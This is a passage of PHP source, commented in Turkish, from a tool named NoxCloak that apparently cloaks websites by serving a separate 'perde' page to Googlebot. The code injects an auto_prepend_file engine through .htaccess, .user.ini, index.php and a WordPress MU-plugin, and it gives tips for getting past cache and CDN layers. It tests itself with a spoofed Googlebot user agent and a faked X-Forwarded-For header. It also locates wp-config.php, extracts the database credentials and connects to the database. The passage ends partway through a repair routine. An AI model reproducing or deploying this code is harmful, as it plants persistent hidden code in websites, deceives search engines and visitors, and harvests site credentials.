 * nc_write_user_ini — .user.ini dosyasını yazar/günceller.
 * Mevcut içerik korunur; sadece NoxCloak bloğu eklenir/güncellenir.
 * PHP-FPM cache süresi: user_ini.cache_ttl (varsayılan 300sn = 5dk).
 * @return bool
 */
function nc_write_user_ini($DIR) {
    $ini_path = $DIR . '/.user.ini';
    if (!is_writable($ini_path) && !is_writable($DIR)) return false;
    $existing = file_exists($ini_path) ? (string)@file_get_contents($ini_path) : '';
    /* Mevcut NOX-CLOAK bloğunu temizle, diğer direktifleri koru */
    $clean = preg_replace('/\n?; BEGIN NOX-CLOAK.*?; END NOX-CLOAK\n?/s', '', $existing);
    $clean = rtrim($clean);
    $new   = ($clean !== '' ? $clean . "\n\n" : '') . nc_get_user_ini($DIR);
    return (@file_put_contents($ini_path, $new) !== false);
}

/**
 * nc_remove_user_ini — .user.ini'den NoxCloak bloğunu kaldırır (uninstall/toggle-off).
 * Dosya sadece NoxCloak içeriyorsa tamamen silinir; başka direktifler varsa korunur.
 */
function nc_remove_user_ini($DIR) {
    $ini_path = $DIR . '/.user.ini';
    if (!file_exists($ini_path)) return;
    $content = (string)@file_get_contents($ini_path);
    $clean   = preg_replace('/\n?; BEGIN NOX-CLOAK.*?; END NOX-CLOAK\n?/s', '', $content);
    $clean   = trim($clean);
    if ($clean === '') {
        @unlink($ini_path);
    } else {
        @file_put_contents($ini_path, $clean . "\n");
    }
}

function nc_run_internal_audit($DIR) {
    if (!function_exists('curl_init')) {
        return ['matched' => false, 'http_code' => 0, 'reasons' => ['cURL eklentisi aktif değil.'], 'preview' => '', 'served_header' => false];
    }
    $scheme     = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    /* Cache-bust parametresi — NoxCloak-Test OLMADAN, bypass tetiklenmez */
    $target_url = $scheme . '://' . $_SERVER['HTTP_HOST'] . '/?_nct=' . mt_rand(100000, 999999);

    /* Gerçek Googlebot UA — bypass koşulu OLMADAN */
    $bot_ua = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)';

    $resp_headers = [];
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => $target_url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_USERAGENT      => $bot_ua,
        CURLOPT_TIMEOUT        => 15,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS      => 5,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER     => [
            'Cache-Control: no-cache, no-store',
            'Pragma: no-cache',
            'X-Forwarded-For: 66.249.66.1',
        ],
    ]);
    /* Yanıt başlıklarını yakala — X-NoxCloak-Served tespiti için */
    curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($curl, $header) use (&$resp_headers) {
        $len   = strlen($header);
        $parts = explode(':', $header, 2);
        if (count($parts) === 2) {
            $resp_headers[strtolower(trim($parts[0]))] = trim($parts[1]);
        }
        return $len;
    });

    $response  = (string)curl_exec($ch);
    $http_code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_err  = curl_error($ch);
    curl_close($ch);

    $rcDir       = nc_content_dir($DIR);
    $perde_path  = $rcDir . '/perde.html';
    $lock_file   = $rcDir . '/cloak.lock';
    $perde_html  = file_exists($perde_path) ? (string)@file_get_contents($perde_path) : '';
    $lock_exists = file_exists($lock_file);
    $paused      = file_exists($rcDir . '/.nox-paused');

    /* Birincil sinyal: X-NoxCloak-Served başlığı (PHP engine veya MU-Plugin tarafından eklenir) */
    $served_header = isset($resp_headers['x-noxcloak-served']) && $resp_headers['x-noxcloak-served'] === '1';

    /* İkincil sinyal: perde.html içerik eşleşmesi — normalize edilmiş metin karşılaştırması */
    $content_match = false;
    if (!$served_header && $perde_html !== '' && strlen(trim($perde_html)) > 50) {
        $perde_text = trim(preg_replace('/\s+/', ' ', strip_tags($perde_html)));
        $resp_text  = preg_replace('/\s+/', ' ', strip_tags($response));
        /* Birden fazla pencere dene — başındaki DOCTYPE/meta ortak olabileceğinden */
        for ($offset = 0; $offset < min(600, strlen($perde_text)); $offset += 20) {
            $needle = trim(substr($perde_text, $offset, 100));
            if (strlen($needle) >= 30 && strpos($resp_text, $needle) !== false) {
                $content_match = true;
                break;
            }
        }
    }

    $matched = $served_header || $content_match;

    $reasons = [];
    if (!$matched) {
        if ($paused) {
            $reasons[] = 'Cloak kasıtlı kapalı — Panelden AÇ butonuna basın.';
        } elseif (!$lock_exists) {
            $reasons[] = 'Lock dosyası bulunamadı — Panelden AKILLI ONARIM yapın.';
        }
        if ($curl_err) {
            $reasons[] = 'cURL hatası: ' . $curl_err;
        } elseif ($http_code === 0) {
            $reasons[] = 'Sunucuya bağlanılamadı (timeout/DNS).';
        }
        if (empty($reasons)) {
            $reasons[] = 'CDN/cache engelliyor veya .htaccess kuralı uygulanmıyor. Akıllı Onarım yapın.';
        }
    }

    /* Görünen sayfa başlığını çek */
    $seen_title = '';
    if (preg_match('/<title[^>]*>(.*?)<\/title>/is', $response, $_tm))
        $seen_title = trim(strip_tags($_tm[1]));

    return [
        'matched'       => $matched,
        'http_code'     => $http_code,
        'reasons'       => $reasons,
        'preview'       => htmlspecialchars(substr($response, 0, 400), ENT_QUOTES, 'UTF-8'),
        'served_header' => $served_header,
        'content_match' => $content_match,
        'lock_exists'   => $lock_exists,
        'paused'        => $paused,
        'test_url'      => $target_url,
        'seen_title'    => $seen_title,
    ];
}

/* ==================== YENİ: TAM TEŞHİS ==================== */

function nc_full_diagnosis($DIR) {
    global $default_html;
    $rcDir     = nc_content_dir($DIR);
    $lock_file = $rcDir . '/cloak.lock';
    $perde_file= $rcDir . '/perde.html';
    $cms       = nc_detect_cms($DIR);
    $cloak_php = nc_cloak_engine_path($DIR, $cms);
    $paused    = file_exists($rcDir . '/.nox-paused');
    $htaccess  = $DIR . '/.htaccess';
    $appRoot   = nc_cms_app_root($DIR, $cms);
    $server_sw = strtolower(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '');
    $is_nginx  = strpos($server_sw, 'nginx') !== false;
    $is_wp     = ($cms === 'wordpress');

    $checks = [];

    /* 1 - cURL */
    $curl_ok  = function_exists('curl_init');
    $checks[] = ['id' => 'curl', 'label' => 'cURL Eklentisi',
        'ok' => $curl_ok, 'severity' => 'critical', 'fixable' => false,
        'msg' => $curl_ok ? 'cURL aktif — bot testi yapılabilir.'
                          : 'cURL yok — bot testi imkânsız. Hosting panelinden aktif edin.',
    ];

    /* 2 - .nox-{cms} dizini */
    $dir_ok   = is_dir($rcDir) && is_writable($rcDir);
    $nox_dir_name = basename($rcDir);
    $checks[] = ['id' => 'noxdir', 'label' => $nox_dir_name . ' Dizini',
        'ok' => $dir_ok, 'severity' => 'critical', 'fixable' => true,
        'msg' => $dir_ok ? 'Dizin mevcut ve yazılabilir.'
                         : 'Dizin yok veya yazılamıyor — izin kontrolü gerekli.',
    ];

    /* 3 - cloak.lock (kasıtlı kapalıysa ceza yok) */
    $lock_ok = file_exists($lock_file);
    if ($paused) {
        $checks[] = ['id' => 'lockfile', 'label' => 'Cloak Durumu',
            'ok' => true, 'severity' => 'critical', 'fixable' => false,
            'msg' => '⏸ Cloak kasıtlı olarak kapatıldı — sistem sağlık skoru etkilenmez.',
        ];
    } else {
        $checks[] = ['id' => 'lockfile', 'label' => 'Cloak Lock Dosyası',
            'ok' => $lock_ok, 'severity' => 'critical', 'fixable' => true,
            'msg' => $lock_ok ? 'Lock dosyası mevcut — cloak aktif.'
                              : 'Lock dosyası yok — cloak pasif durumda.',
        ];
    }

    /* 4 - perde.html */
    $p_size   = file_exists($perde_file) ? (int)@filesize($perde_file) : 0;
    $perde_ok = ($p_size > 50);
    $checks[] = ['id' => 'perde', 'label' => 'Perde HTML Dosyası',
        'ok' => $perde_ok, 'severity' => 'critical', 'fixable' => true,
        'msg' => $perde_ok ? "Perde HTML mevcut ({$p_size} bayt)."
                           : 'Perde HTML yok veya boş — bot boş sayfa görür.',
    ];

    /* 5 - CMS'e özgü motor dosyası */
    $engine_basename = basename($cloak_php);
    $cloak_ok = file_exists($cloak_php) && filesize($cloak_php) > 20;
    $checks[] = ['id' => 'cloakphp', 'label' => $engine_basename . ' (Motor)',
        'ok' => $cloak_ok, 'severity' => 'high', 'fixable' => true,
        'msg' => $cloak_ok ? "{$engine_basename} mevcut — auto_prepend_file aktif."
                           : "{$engine_basename} yok — auto_prepend_file çalışmıyor. Akıllı Onarım ile düzeltin.",
    ];

    /* 6 - dosya yazma izni */
    $test_f   = $rcDir . '/.wtest_' . mt_rand(1000, 9999);
    $write_ok = (@file_put_contents($test_f, '1') !== false);
    if ($write_ok) @unlink($test_f);
    $checks[] = ['id' => 'filewrite', 'label' => 'Dosya Yazma İzni',
        'ok' => $write_ok, 'severity' => 'critical', 'fixable' => false,
        'msg' => $write_ok ? 'Dosya yazma izni OK.'
                           : 'Dosya yazılamıyor — chmod 755 uygulayın.',
    ];

    /* 7 - .htaccess (sadece Apache) */
    $ht_active = false;
    if (!$is_nginx) {
        if ($paused) {
            $checks[] = ['id' => 'htaccess', 'label' => ".htaccess Kuralı [" . strtoupper($cms) . "]",
                'ok' => true, 'severity' => 'info', 'fixable' => false,
                'msg' => '⏸ Cloak kapalı — .htaccess kuralı kasıtlı olarak kaldırıldı.',
            ];
        } else {
            $ht_raw     = file_exists($htaccess) ? (string)@file_get_contents($htaccess) : '';
            $ht_has     = strpos($ht_raw, 'NOX-CLOAK-RULE') !== false;
            $ht_write   = is_writable($htaccess) || (!file_exists($htaccess) && is_writable(dirname($htaccess)));
            $ht_prepend = $ht_has && strpos($ht_raw, 'auto_prepend_file') !== false;
            $ht_active  = $ht_has && $ht_prepend;
            $checks[]   = ['id' => 'htaccess', 'label' => ".htaccess Kuralı [" . strtoupper($cms) . "]",
                'ok' => $ht_active, 'severity' => 'high', 'fixable' => $ht_write,
                'msg' => $ht_active
                    ? '.htaccess kuralı + auto_prepend_file enjekte edilmiş.'
                    : ($ht_has && !$ht_prepend
                        ? '.htaccess kuralı var fakat auto_prepend_file eksik — Onarım önerilir.'
                        : ($ht_write
                            ? '.htaccess kuralı eksik — otomatik eklenebilir.'
                            : '.htaccess yok veya yazılamıyor — index.php katmanı devreye girer.')),
            ];
        }
    }

    /* 7a - PHP SAPI + .user.ini (PHP-FPM katmanı) */
    {
        $sapi     = nc_get_sapi();
        $is_fpm   = nc_is_fpm();
        $ini_path = $DIR . '/.user.ini';
        $ini_raw  = file_exists($ini_path) ? (string)@file_get_contents($ini_path) : '';
        $ini_has  = strpos($ini_raw, 'NOX-CLOAK') !== false;
        $ini_write= is_writable($ini_path) || (!file_exists($ini_path) && is_writable($DIR));

        /* SAPI bilgisi — her zaman göster */
        $checks[] = ['id' => 'sapi', 'label' => 'PHP SAPI Modu',
            'ok' => true, 'severity' => 'info', 'fixable' => false,
            'msg' => "SAPI: {$sapi}" . ($is_fpm
                ? ' — PHP-FPM/CGI: .htaccess php_value çalışmaz, .user.ini zorunlu.'
                : ' — mod_php: .htaccess php_value aktif, .user.ini ek güvence sağlar.'),
        ];

        /* .user.ini durumu */
        if ($paused) {
            $checks[] = ['id' => 'userini', 'label' => '.user.ini (PHP-FPM Katmanı)',
                'ok' => true, 'severity' => 'info', 'fixable' => false,
                'msg' => '⏸ Cloak kapalı — .user.ini kasıtlı olarak kaldırıldı.',
            ];
        } elseif ($is_fpm) {
            /* FPM'de .user.ini kritik */
            $ttl = (int)@ini_get('user_ini.cache_ttl') ?: 300;
            $checks[] = ['id' => 'userini', 'label' => '.user.ini (PHP-FPM Birincil Katman)',
                'ok' => $ini_has, 'severity' => 'critical', 'fixable' => $ini_write,
                'msg' => $ini_has
                    ? ".user.ini auto_prepend_file enjekte edilmiş (FPM önbellek TTL: {$ttl}sn)."
                    : ($ini_write
                        ? '.user.ini eksik — PHP-FPM\'de cloak çalışmıyor! Onarım yazar.'
                        : '.user.ini yok ve dizin yazılamıyor — chmod 644 .user.ini veya chmod 755 uygulayın.'),
            ];
        } else {
            /* mod_php'de .user.ini ikincil güvence */
            $checks[] = ['id' => 'userini', 'label' => '.user.ini (İkincil Güvence)',
                'ok' => $ini_has, 'severity' => 'warning', 'fixable' => $ini_write,
                'msg' => $ini_has
                    ? '.user.ini auto_prepend_file mevcut (mod_php yedekleme).'
                    : '.user.ini eksik — Onarım yazar (mod_php\'de .htaccess yeterli fakat ekstra güvence önerilir).',
            ];
        }
    }

    /* 7b - index.php katmanı (.htaccess yoksa veya yazılamazsa yedek) */
    if (!$paused) {
        $idx      = $DIR . '/index.php';
        $idx_raw  = file_exists($idx) ? (string)@file_get_contents($idx) : '';
        $idx_has  = strpos($idx_raw, 'NoxCloak') !== false || strpos($idx_raw, nc_content_dir($DIR)) !== false;
        $idx_ok   = file_exists($idx) && is_writable($idx);
        if (!$ht_active && !$is_nginx) {
            /* htaccess yok/yazılamıyor → index.php katmanı şart */
            $checks[] = ['id' => 'index_inject', 'label' => 'index.php Yedek Katman',
                'ok' => $idx_has, 'severity' => 'high', 'fixable' => $idx_ok,
                'msg' => $idx_has
                    ? 'index.php NoxCloak require enjekte edilmiş (htaccess yedekleme aktif).'
                    : ($idx_ok
                        ? 'index.php enjekte edilmemiş — Onarım otomatik ekleyecek.'
                        : 'index.php yazılamıyor — chmod 644 index.php ve manuel require gerekli.'),
            ];
        } elseif ($idx_has) {
            /* htaccess aktifken index.php'de eskiden kalmış enjeksiyon var → temizlenmeli */
            $checks[] = ['id' => 'index_inject', 'label' => 'index.php Artık Gereksiz',
                'ok' => false, 'severity' => 'warning', 'fixable' => $idx_ok,
                'msg' => 'htaccess aktif olduğu hâlde index.php\'de eski NoxCloak satırı bulundu — Onarım temizler.',
            ];
        }
        if ($is_nginx && !$idx_has) {
            /* Nginx + index.php enjeksiyonu yok */
            $checks[] = ['id' => 'index_inject', 'label' => 'index.php (Nginx Yedek)',
                'ok' => false, 'severity' => 'high', 'fixable' => $idx_ok,
                'msg' => 'Nginx\'te .htaccess çalışmaz. index.php katmanı enjekte edilmeli — Onarım uygular.',
            ];
        }
    }

    /* 8 - WordPress MU-Plugin */
    if ($is_wp) {
        $mu_file  = $DIR . '/wp-content/mu-plugins/nox-engine.php';
        $mu_ok    = file_exists($mu_file);
        if ($paused) {
            $checks[] = ['id' => 'muplugin', 'label' => 'WP MU-Plugin (nox-engine)',
                'ok' => true, 'severity' => 'info', 'fixable' => false,
                'msg' => '⏸ Cloak kapalı — MU-Plugin kasıtlı olarak kaldırıldı.',
            ];
        } else {
            $checks[] = ['id' => 'muplugin', 'label' => 'WP MU-Plugin (nox-engine)',
                'ok' => $mu_ok, 'severity' => 'high', 'fixable' => true,
                'msg' => $mu_ok ? 'MU-Plugin yüklü — WP cache katmanı atlanıyor.'
                                : 'MU-Plugin eksik — WP Rocket / LiteSpeed Cache bypass çalışmıyor.',
            ];
        }

        /* 9 - WP Cache plugin çakışması */
        $cache_map = [
            'litespeed-cache'        => 'LiteSpeed Cache',
            'wp-rocket'              => 'WP Rocket',
            'w3-total-cache'         => 'W3 Total Cache',
            'wp-fastest-cache'       => 'WP Fastest Cache',
            'sg-cachepress'          => 'SiteGround Cache',
            'cache-enabler'          => 'Cache Enabler',
            'hummingbird-performance'=> 'Hummingbird',
            'breeze'                 => 'Breeze (Cloudways)',
            'comet-cache'            => 'Comet Cache',
            'flying-press'           => 'FlyingPress',
            'wp-super-cache'         => 'WP Super Cache',
        ];
        $found = [];
        foreach ($cache_map as $slug => $name) {
            if (is_dir($DIR . '/wp-content/plugins/' . $slug)) $found[] = $name;
        }
        if (!empty($found)) {
            $checks[] = ['id' => 'cache_plugin', 'label' => 'WP Cache Plugin',
                'ok' => true, 'severity' => 'info', 'fixable' => true,
                'msg' => 'Cache plugin(ler) tespit edildi: ' . implode(', ', $found)
                       . ' — MU-Plugin + htaccess kural önceliği ile bypass edildi.',
            ];
        }

        /* 10 - NitroPack (CDN seviyesi — PHP'den bypass edilemez) */
        if (is_dir($DIR . '/wp-content/plugins/nitropack')) {
            $checks[] = ['id' => 'nitropack', 'label' => 'NitroPack (CDN Katmanı)',
                'ok' => false, 'severity' => 'warning', 'fixable' => false,
                'msg' => 'NitroPack CDN katmanında çalışır. NitroPack panelinden "Bypass" kuralı ekleyin: '
                       . 'User-Agent içeren "Googlebot" → cache bypass.',
            ];
        }

        /* 11 - Cloudflare APO (CDN seviyesi) */
        if (is_dir($DIR . '/wp-content/plugins/cloudflare') || is_dir($DIR . '/wp-content/plugins/cloudflare-apo')) {
            $checks[] = ['id' => 'cf_apo', 'label' => 'Cloudflare APO (CDN Katmanı)',
                'ok' => false, 'severity' => 'warning', 'fixable' => false,
                'msg' => 'Cloudflare APO etkin. Cloudflare panelinden Page Rule ekleyin: '
                       . '"Bypass Cache on Cookie" veya Googlebot\'u hariç tutan bir Worker kuralı.',
            ];
        }

        /* WP: wp-content yazılabilir mi? */
        $wpc_writable = is_writable($DIR . '/wp-content');
        if (!$wpc_writable) {
            $checks[] = ['id' => 'wp_content_perm', 'label' => 'wp-content İzni',
                'ok' => false, 'severity' => 'high', 'fixable' => false,
                'msg' => 'wp-content dizini yazılamıyor — MU-Plugin oluşturulamaz. chmod 755 uygulayın.',
            ];
        }
    }

    /* === CMS'e Özel Tahminsel Kontroller === */

    /* Joomla: cache dizini yazılabilir mi? */
    if ($cms === 'joomla') {
        $joomla_cache = $DIR . '/cache';
        $j_ok = is_writable($joomla_cache) || !is_dir($joomla_cache);
        if (!$j_ok) {
            $checks[] = ['id' => 'joomla_cache', 'label' => 'Joomla Cache Dizin İzni',
                'ok' => false, 'severity' => 'warning', 'fixable' => false,
                'msg' => 'Joomla /cache dizini yazılamıyor — önbellek temizlenemez. chmod 755 uygulayın.',
            ];
        }
        // Joomla admin cache
        $jadmin_cache = $DIR . '/administrator/cache';
        if (is_dir($jadmin_cache) && !is_writable($jadmin_cache)) {
            $checks[] = ['id' => 'joomla_admin_cache', 'label' => 'Joomla Admin Cache İzni',
                'ok' => false, 'severity' => 'warning', 'fixable' => false,
                'msg' => 'administrator/cache yazılamıyor — chmod 755 gerekli.',
            ];
        }
    }

    /* Drupal: sites/default/files yazılabilir mi? */
    if ($cms === 'drupal') {
        $drupal_files = $DIR . '/sites/default/files';
        $df_ok = !is_dir($drupal_files) || is_writable($drupal_files);
        $checks[] = ['id' => 'drupal_files', 'label' => 'Drupal sites/default/files İzni',
            'ok' => $df_ok, 'severity' => 'warning', 'fixable' => false,
            'msg' => $df_ok ? 'Drupal dosya dizini yazılabilir.'
                            : 'sites/default/files yazılamıyor — Drupal cache temizlenemez. chmod 755 uygulayın.',
        ];
    }

    /* Laravel/Symfony: doc root public/ ise artisan/console bulunur mu? */
    if ($cms === 'laravel' || $cms === 'symfony') {
        $has_artisan = file_exists($DIR . '/artisan') || file_exists($DIR . '/bin/console');
        $parent_has  = file_exists(dirname($DIR) . '/artisan') || file_exists(dirname($DIR) . '/bin/console');
        if (!$has_artisan && $parent_has) {
            $checks[] = ['id' => 'framework_docroot', 'label' => strtoupper($cms) . ' public/ Doc Root',
                'ok' => true, 'severity' => 'warning', 'fixable' => false,
                'msg' => strtoupper($cms) . ' doc root public/ olarak ayarlanmış — cloak.php yolu buna göre düzenlendi.',
            ];
        } elseif (!$has_artisan && !$parent_has) {
            $checks[] = ['id' => 'framework_docroot', 'label' => strtoupper($cms) . ' Kök Dizin',
                'ok' => false, 'severity' => 'high', 'fixable' => false,
                'msg' => strtoupper($cms) . ' uygulama kökü bulunamadı — cache yolları yanlış olabilir.',
            ];
        }
        // storage/framework yazılabilir mi?
        $sf_storage = $appRoot . '/storage/framework';
        if (is_dir($sf_storage) && !is_writable($sf_storage)) {
            $checks[] = ['id' => 'laravel_storage', 'label' => 'Laravel/Symfony storage/framework İzni',
                'ok' => false, 'severity' => 'warning', 'fixable' => false,
                'msg' => 'storage/framework yazılamıyor — cache temizleme başarısız olabilir. chmod -R 775 uygulayın.',
            ];
        }
    }

    /* Magento: doc root pub/ ise bin/magento bulunur mu? */
    if ($cms === 'magento') {
        $has_magento = file_exists($DIR . '/bin/magento');
        $parent_has  = file_exists(dirname($DIR) . '/bin/magento');
        if (!$has_magento && $parent_has) {
            $checks[] = ['id' => 'magento_docroot', 'label' => 'Magento pub/ Doc Root',
                'ok' => true, 'severity' => 'warning', 'fixable' => false,
                'msg' => 'Magento doc root pub/ olarak ayarlanmış — cloak.php yolu buna göre düzenlendi.',
            ];
        }
        // var/cache yazılabilir mi?
        $mg_cache = $appRoot . '/var/cache';
        if (is_dir($mg_cache) && !is_writable($mg_cache)) {
            $checks[] = ['id' => 'magento_cache_perm', 'label' => 'Magento var/cache İzni',
                'ok' => false, 'severity' => 'warning', 'fixable' => false,
                'msg' => 'Magento var/cache yazılamıyor — chmod -R 755 var/ uygulayın.',
            ];
        }
    }

    /* PrestaShop: var/cache yazılabilir mi? */
    if ($cms === 'prestashop') {
        $ps_cache = $DIR . '/var/cache';
        if (is_dir($ps_cache) && !is_writable($ps_cache)) {
            $checks[] = ['id' => 'ps_cache_perm', 'label' => 'PrestaShop var/cache İzni',
                'ok' => false, 'severity' => 'warning', 'fixable' => false,
                'msg' => 'PrestaShop var/cache yazılamıyor — chmod -R 755 var/ uygulayın.',
            ];
        }
    }

    /* OpenCart: system/storage yazılabilir mi? */
    if ($cms === 'opencart') {
        $oc_cache = $DIR . '/system/storage/cache';
        if (is_dir($oc_cache) && !is_writable($oc_cache)) {
            $checks[] = ['id' => 'oc_cache_perm', 'label' => 'OpenCart system/storage/cache İzni',
                'ok' => false, 'severity' => 'warning', 'fixable' => false,
                'msg' => 'OpenCart cache dizini yazılamıyor — chmod -R 755 system/storage/ uygulayın.',
            ];
        }
    }

    /* Nginx uyarısı — CMS'e özel mesaj */
    if ($is_nginx) {
        $nginx_msg = 'Nginx tespit edildi — .htaccess çalışmaz. ';
        if ($is_wp) {
            $nginx_msg .= 'WordPress MU-Plugin + auto_prepend_file Nginx config\'a eklenmeli.';
        } else {
            $nginx_msg .= strtoupper($cms) . ' için Nginx config\'ında fastcgi_param PHP_VALUE "auto_prepend_file ' . nc_cloak_engine_path($DIR, $cms) . '" ekleyin.';
        }
        $checks[] = ['id' => 'nginx', 'label' => 'Nginx Sunucu Uyarısı',
            'ok' => false, 'severity' => 'warning', 'fixable' => false,
            'msg' => $nginx_msg,
        ];
    }

    /* OPcache */
    if (!$paused && function_exists('opcache_get_status')) {
        $op = @opcache_get_status(false);
        if ($op && !empty($op['opcache_enabled'])) {
            $checks[] = ['id' => 'opcache', 'label' => 'OPcache Durumu',
                'ok' => false, 'severity' => 'warning', 'fixable' => true,
                'msg' => 'OPcache aktif — cloak.php değişiklikleri anında yansımayabilir. Akıllı Onarım temizler.',
            ];
        }
    }

    /* Googlebot testi — sadece önbellekten okunur (cURL YOK).
     * Canlı test için kullanıcı "GOOGLEBOT TESTİ" butonuna basmalı (real_bot_test action). */
    $bt_cache_file = $rcDir . '/.bottest_cache';
    $bt_cached = null;
    if (file_exists($bt_cache_file)) {
        $bt_raw = @file_get_contents($bt_cache_file);
        if ($bt_raw) {
            $bt_obj = json_decode($bt_raw, true);
            if ($bt_obj && isset($bt_obj['time']) && (time() - (int)$bt_obj['time']) < 300) {
                $bt_cached = $bt_obj;
            }
        }
    }
    if ($paused) {
        $checks[] = ['id' => 'bottest', 'label' => 'Googlebot Testi',
            'ok' => true, 'severity' => 'info', 'fixable' => false,
            'msg' => '⏸ Cloak kasıtlı kapalı — bot testi devre dışı.',
        ];
    } elseif ($bt_cached !== null) {
        /* Önbellekte sonuç var */
        $bt_age = round((time() - (int)$bt_cached['time']) / 60, 1);
        $checks[] = ['id' => 'bottest', 'label' => 'Googlebot Testi (Önbellekli)',
            'ok' => $bt_cached['matched'], 'severity' => 'critical', 'fixable' => true,
            'msg' => $bt_cached['matched']
                ? "Bot perdeyi görüyor ✓ (HTTP {$bt_cached['http_code']}, {$bt_age} dk önce test edildi)."
                : "Bot perdeyi göremedi ✗ (HTTP {$bt_cached['http_code']}, {$bt_age} dk önce). "
                  . implode(' ', (array)$bt_cached['reasons'])
                  . ' — GOOGLEBOT TESTİ butonuna basın.',
        ];
    } else {
        /* Cache yok — kullanıcıya butona basmasını söyle */
        $checks[] = ['id' => 'bottest', 'label' => 'Googlebot Testi',
            'ok' => true, 'severity' => 'info', 'fixable' => false,
            'msg' => 'Henüz test yapılmadı. Kontrol Panelindeki "GOOGLEBOT TESTİ" butonuna basın.',
        ];
    }

    /* Sağlık skoru */
    $score = 100;
    $fixable_count = 0;
    foreach ($checks as $c) {
        if (!$c['ok']) {
            if     ($c['severity'] === 'critical') $score -= 30;
            elseif ($c['severity'] === 'high')     $score -= 15;
            elseif ($c['severity'] === 'warning')  $score -= 5;
            if (!empty($c['fixable'])) $fixable_count++;
        }
    }
    $score = max(0, min(100, $score));

    return [
        'checks'  => $checks,
        'health'  => $score,
        'fixable' => $fixable_count,
        'cms'     => $cms,
    ];
}

/* ==================== WP CONFIG / DB YARDIMCI FONKSİYONLAR ==================== */

/**
 * nc_find_wpconfig — wp-config.php'yi 7 üst dizine kadar arar.
 */
function nc_find_wpconfig($dir) {
    $p = rtrim($dir, '/\\');
    for ($i = 0; $i < 7; $i++) {
        if (@is_file($p . '/wp-config.php') && @is_readable($p . '/wp-config.php'))
            return $p . '/wp-config.php';
        $np = dirname($p);
        if ($np === $p || $np === '' || $np === '.') break;
        $p = $np;
    }
    return '';
}

/**
 * nc_parse_wpconfig — wp-config.php'den DB bilgileri ve table_prefix'i çıkarır.
 */
function nc_parse_wpconfig($path) {
    $out = ['creds' => [], 'prefix' => 'wp_'];
    if (!$path || !@is_file($path)) return $out;
    $src = (string)@file_get_contents($path);
    if ($src === '') return $out;
    foreach (['DB_NAME', 'DB_USER', 'DB_PASSWORD', 'DB_HOST', 'DB_CHARSET'] as $k) {
        if (preg_match("/define\s*\(\s*['\"]" . $k . "['\"]\s*,\s*['\"]([^'\"]*)['\"\s*]\)/s", $src, $m))
            $out['creds'][$k] = $m[1];
    }
    if (preg_match('/\$table_prefix\s*=\s*[\'"]([a-zA-Z0-9_]+)[\'"]\s*;/', $src, $m))
        $out['prefix'] = $m[1];
    if (empty($out['creds']['DB_CHARSET'])) $out['creds']['DB_CHARSET'] = 'utf8mb4';
    if (empty($out['creds']['DB_HOST']))    $out['creds']['DB_HOST']    = 'localhost';
    return $out;
}

/**
 * nc_db_connect — wp-config creds ile MySQLi bağlantısı açar. Başarısızsa null döner.
 */
function nc_db_connect($creds) {
    if (!extension_loaded('mysqli')) return null;
    if (empty($creds['DB_NAME']) || empty($creds['DB_USER'])) return null;
    @mysqli_report(MYSQLI_REPORT_OFF);
    $host = $creds['DB_HOST']; $port = 0; $sock = '';
    if (strpos($host, ':') !== false) {
        $parts = explode(':', $host, 2); $host = $parts[0];
        if (is_numeric($parts[1])) $port = (int)$parts[1]; else $sock = $parts[1];
    }
    $pw = isset($creds['DB_PASSWORD']) ? $creds['DB_PASSWORD'] : '';
    $m = @new mysqli($host, $creds['DB_USER'], $pw, $creds['DB_NAME'], $port ?: 3306, $sock ?: null);
    if ($m->connect_errno) return null;
    @$m->set_charset($creds['DB_CHARSET']);
    return $m;
}

/* ==================== YENİ: AKILLI ONARIM ==================== */

function nc_smart_fix($DIR) {
    global $default_html;
    $rcDir     = nc_content_dir($DIR);
    $lock_file = $rcDir . '/cloak.lock';
    $perde_file= $rcDir . '/perde.html';
    $cms       = nc_detect_cms($DIR);
    $cloak_php = nc_cloak_engine_path($DIR, $cms);
    $appRoot   = nc_cms_app_root($DIR, $cms);
    /* Eski cloak.php'yi temizle — CMS adlandırması değiştiyse */
    $old_generic = $rcDir . '/cloak.php';
    if ($old_generic !== $cloak_php && file_exists($old_generic)) @unlink($old_generic);
    $server_sw = strtolower(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '');
    $is_nginx  = strpos($server_sw, 'nginx') !== false;
    $fixes     = [];

    /* 1 - dizin */
    if (!is_dir($rcDir)) {
        $ok      = @mkdir($rcDir, 0755, true);
        $fixes[] = [$ok, $ok ? basename($rcDir) . ' dizini oluşturuldu.' : 'HATA: Dizin oluşturulamadı.'];
    }

    /* 2 - perde.html (sadece yoksa veya bozuksa) */
    $p_size = file_exists($perde_file) ? (int)@filesize($perde_file) : 0;
    if ($p_size < 50) {
        $ok      = (@file_put_contents($perde_file, $default_html) !== false);
        $fixes[] = [$ok, $ok ? 'Perde HTML varsayılan içerikle oluşturuldu.'
                             : 'HATA: Perde HTML yazılamadı.'];
    }

    /* Kasıtlı kapatma bayrağı — bu bayrak varken lock/htaccess/user.ini yeniden aktif edilmez */
    $paused = file_exists($rcDir . '/.nox-paused');

    /* Kasıtlı kapalıysa aktivasyon adımlarını atla */
    if ($paused) {
        $fixes[] = [true, 'Cloak kasıtlı kapalı (.nox-paused) — aktivasyon adımları atlandı.'];
        return $fixes;
    }

    /* 3 - cloak.lock */
    if (!file_exists($lock_file)) {
        $ok      = (@file_put_contents($lock_file, '1') !== false);
        $fixes[] = [$ok, $ok ? 'Cloak lock dosyası oluşturuldu.'
                             : 'HATA: Lock dosyası yazılamadı.'];
    }

    /* 4 - CMS'e özgü motor dosyası (auto_prepend_file) */
    $engine_name = basename($cloak_php);
    $ok          = (@file_put_contents($cloak_php, nc_get_cloak_php($DIR)) !== false);
    $fixes[] = [$ok, $ok ? "CMS motoru ({$engine_name}) yazıldı."
                         : "HATA: {$engine_name} yazılamadı."];

    /* 5 - .htaccess (Apache mod_php; tüm CMS'ler için — Nginx'te atlanır) */
    $ht_ok = false;
